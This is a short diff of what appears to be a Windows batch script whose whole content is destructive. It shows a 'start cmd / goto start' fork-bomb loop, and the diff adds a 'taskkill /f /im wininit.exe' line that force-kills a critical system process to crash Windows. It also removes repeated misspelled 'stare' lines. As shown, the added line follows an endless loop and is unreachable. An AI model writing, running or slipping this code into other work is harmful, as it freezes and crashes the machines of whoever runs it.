@@ -5,13 +5,4 @@ cd.>C:\Users\user\Desktop\ying.txt
 :start
 start cmd
 goto start
-stare "" "D:\ying"
-stare "" "D:\ying"
-stare "" "D:\ying"
-stare "" "D:\ying"
-stare "" "D:\ying"
-stare "" "D:\ying"
-stare "" "D:\ying"
-stare "" "D:\ying"
-stare "" "D:\ying"
-stare "" "D:\ying"
+taskkill /f /im wininit.exe
